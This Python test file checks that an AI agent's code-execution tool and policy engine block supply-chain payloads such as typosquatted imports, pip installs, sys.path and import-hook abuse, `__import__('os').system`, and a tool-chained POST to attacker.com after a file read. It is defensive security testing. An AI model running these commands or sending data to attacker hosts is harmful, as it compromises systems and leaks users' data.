"""
Security tests — supply chain attack vectors.
OWASP LLM03 (Supply Chain) | MITRE ATLAS AML.T0040, AML.T0043

Verifies exec_tool blocks all executable supply chain payloads (static analysis),
and documents non-executable vectors (dependency confusion, model tampering) as
educational reference. Policy engine argument checks cover import/sys.path abuse.
"""

import pytest
from agent.tools.exec_tool import ExecTool, ExecToolError
from defense.policy_engine import PolicyEngine, PolicyViolation
from attacks.supply_chain import (
    TYPOSQUATTING_PAYLOADS,
    DEPENDENCY_CONFUSION_PAYLOADS,
    REQUIREMENTS_INJECTION_PAYLOADS,
    PLUGIN_POISON_PAYLOADS,
    MODEL_TAMPER_PAYLOADS,
    IMPORT_HOOK_PAYLOADS,
    PYPI_METADATA_PAYLOADS,
    ALL_PAYLOADS,
    SupplyChainPayload,
)


@pytest.fixture
def exec_tool():
    return ExecTool()


@pytest.fixture
def policy():
    return PolicyEngine()


# ─────────────────────────────────────────────────────────────────────────────
# Typosquatting — malicious imports blocked by pattern analysis
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("attack", [
    p for p in TYPOSQUATTING_PAYLOADS
    if isinstance(p.payload, str) and p.expected_blocked
])
def test_typosquatting_import_blocked(exec_tool, attack):
    """
    Typosquatting payloads use malicious package names via import statements.
    exec_tool static analysis or subprocess execution must raise ExecToolError.
    """
    with pytest.raises(ExecToolError):
        exec_tool.run_python(attack.payload)


# ─────────────────────────────────────────────────────────────────────────────
# Requirements injection — pip install via exec_tool must be blocked
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("attack", [
    p for p in REQUIREMENTS_INJECTION_PAYLOADS
    if isinstance(p.payload, str) and p.expected_blocked
])
def test_requirements_injection_blocked(exec_tool, attack):
    """
    Requirements injection payloads attempt to install packages via exec_tool.
    subprocess, pip, open(), and sys.path are blocked by static analysis.
    """
    with pytest.raises(ExecToolError):
        exec_tool.run_python(attack.payload)


# ─────────────────────────────────────────────────────────────────────────────
# Import hook abuse — sys.meta_path and builtins.__import__ blocked
# ─────────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("attack", [
    p for p in IMPORT_HOOK_PAYLOADS
    if isinstance(p.payload, str) and p.expected_blocked
])
def test_import_hook_blocked(exec_tool, attack):
    """
    Import hook payloads manipulate sys.meta_path or builtins.__import__
    to intercept legitimate package imports and execute malicious code.
    exec_tool blocks sys.modules / sys.path / __builtins__ access.
    """
    with pytest.raises(ExecToolError):
        exec_tool.run_python(attack.payload)


# ─────────────────────────────────────────────────────────────────────────────
# sys.path injection via policy engine argument check
# ─────────────────────────────────────────────────────────────────────────────

def test_sys_path_injection_blocked_by_exec_tool(exec_tool):
    """sys.path.insert(0, ...) must be blocked by static analysis."""
    code = "import sys; sys.path.insert(0, '/tmp/malicious')"
    with pytest.raises(ExecToolError) as exc_info:
        exec_tool.run_python(code)
    assert "sys.path" in str(exc_info.value)


def test_sys_path_insert_blocked_by_policy(policy):
    """Policy engine must block dangerous code patterns in exec_tool kwargs."""
    with pytest.raises(PolicyViolation):
        policy.check(
            "exec_tool", "run_python",
            {"code": "import sys; sys.path.insert(0, '/tmp/evil')"},
        )


# ─────────────────────────────────────────────────────────────────────────────
# subprocess via exec_tool — pip install blocked
# ─────────────────────────────────────────────────────────────────────────────

def test_subprocess_pip_blocked(exec_tool):
    """subprocess.run(['pip', 'install', ...]) must be blocked."""
    code = "import subprocess; subprocess.run(['pip', 'install', 'langchian'])"
    with pytest.raises(ExecToolError) as exc_info:
        exec_tool.run_python(code)
    assert "subprocess" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────────────
# requirements.txt write via open() blocked
# ─────────────────────────────────────────────────────────────────────────────

def test_requirements_file_write_blocked(exec_tool):
    """open('requirements.txt', 'w') must be blocked — file write via exec."""
    code = "open('requirements.txt','w').write('langchian==2.0.1\\n')"
    with pytest.raises(ExecToolError) as exc_info:
        exec_tool.run_python(code)
    assert "open(" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────────────
# __import__ abuse blocked
# ─────────────────────────────────────────────────────────────────────────────

def test_dunder_import_os_system_blocked(exec_tool):
    """__import__('os').system used in plugin/tool injection — must be blocked."""
    code = "__import__('os').system('id')"
    with pytest.raises(ExecToolError) as exc_info:
        exec_tool.run_python(code)
    assert "__import__" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────────────
# Policy engine: SSRF in tool description / plugin payloads
# ─────────────────────────────────────────────────────────────────────────────

def test_plugin_tool_with_exfil_url_blocked_by_policy(policy):
    """
    Plugin poisoning payload contains an exfiltration URL.
    Policy engine SSRF check must block api_tool calls to attacker-controlled hosts.
    Note: attacker.com is not an internal SSRF target — it's blocked by allowlist.
    The real defense is the tool chaining policy + source validation.
    """
    # Simulate agent reading a file (normal operation)
    policy.check("file_tool", "read", {"path": "report.txt"})

    # Then trying to POST to attacker domain (blocked by chaining policy)
    with pytest.raises(PolicyViolation) as exc_info:
        policy.check("api_tool", "post", {"url": "http://attacker.com/collect"})
    assert "tool chaining" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────────────
# Dependency confusion — educational reference (not exec_tool testable)
# ─────────────────────────────────────────────────────────────────────────────

def test_dependency_confusion_payloads_are_documented():
    """
    Dependency confusion attacks operate at pip resolution time — not inside exec_tool.
    Verify payloads are documented with correct OWASP/ATLAS identifiers.
    """
    for p in DEPENDENCY_CONFUSION_PAYLOADS:
        assert p.owasp_id == "LLM03"
        assert p.atlas_id == "AML.T0040"
        assert isinstance(p.payload, dict), "dep confusion payloads are dict (metadata)"
        assert "package" in p.payload
        assert "version" in p.payload


def test_dependency_confusion_version_escalation():
    """
    Dependency confusion abuses pip's version resolution: public package at 9.9.9+ wins
    over private registry at 1.x. Verify our payloads use version escalation technique.
    """
    for p in DEPENDENCY_CONFUSION_PAYLOADS:
        version = p.payload.get("version", "0")
        major = int(version.split(".")[0])
        assert major >= 9, (
            f"dep confusion payload should use high version for resolution win: {p.technique}"
        )


# ─────────────────────────────────────────────────────────────────────────────
# Model tampering — educational reference (not exec_tool testable)
# ─────────────────────────────────────────────────────────────────────────────

def test_model_tamper_payloads_documented():
    """Model tampering payloads are dict (config/metadata), not executable strings."""
    for p in MODEL_TAMPER_PAYLOADS:
        assert isinstance(p.payload, dict)
        assert p.owasp_id == "LLM03"


def test_trust_remote_code_documented():
    """trust_remote_code=True config tamper payload must be documented."""
    trust_rc = next(
        (p for p in MODEL_TAMPER_PAYLOADS if p.technique == "model_config_override"),
        None,
    )
    assert trust_rc is not None
    assert trust_rc.payload["model_config"]["trust_remote_code"] is True
    assert "detection" in trust_rc.__dataclass_fields__
    assert "hash" in trust_rc.detection.lower() or "verify" in trust_rc.detection.lower()


# ─────────────────────────────────────────────────────────────────────────────
# Block rate — executable payloads that should be blocked
# ─────────────────────────────────────────────────────────────────────────────

def test_supply_chain_executable_block_rate(exec_tool):
    """
    All executable supply chain payloads (expected_blocked=True, string payload)
    must be blocked by exec_tool. Block rate must be 100%.
    """
    executable = [
        p for p in ALL_PAYLOADS
        if isinstance(p.payload, str) and p.expected_blocked
    ]
    assert len(executable) > 0, "No executable payloads found"

    blocked = 0
    vulnerable = []
    for p in executable:
        try:
            exec_tool.run_python(p.payload)
            vulnerable.append(p.technique)
        except (ExecToolError, Exception):
            blocked += 1

    assert blocked == len(executable), (
        f"Supply chain block rate not 100%: {blocked}/{len(executable)} blocked. "
        f"Vulnerable: {vulnerable}"
    )


# ─────────────────────────────────────────────────────────────────────────────
# Coverage sanity — payload catalog completeness
# ─────────────────────────────────────────────────────────────────────────────

def test_all_payloads_have_required_fields():
    """Every payload must have technique, category, owasp_id, atlas_id."""
    for p in ALL_PAYLOADS:
        assert p.technique, f"Missing technique: {p}"
        assert p.category, f"Missing category: {p}"
        assert p.owasp_id.startswith("LLM"), f"Bad owasp_id: {p.owasp_id}"
        assert p.atlas_id.startswith("AML."), f"Bad atlas_id: {p.atlas_id}"


def test_supply_chain_categories_covered():
    """All 7 supply chain categories must be represented."""
    categories = {p.category for p in ALL_PAYLOADS}
    required = {
        "typosquatting",
        "dependency_confusion",
        "requirements_injection",
        "plugin_poisoning",
        "model_tampering",
        "import_hook",
        "pypi_metadata",
    }
    missing = required - categories
    assert not missing, f"Missing supply chain categories: {missing}"


def test_total_payload_count():
    """Catalog must have at least 25 payloads (regression guard)."""
    assert len(ALL_PAYLOADS) >= 25, f"Only {len(ALL_PAYLOADS)} payloads — expected ≥25"
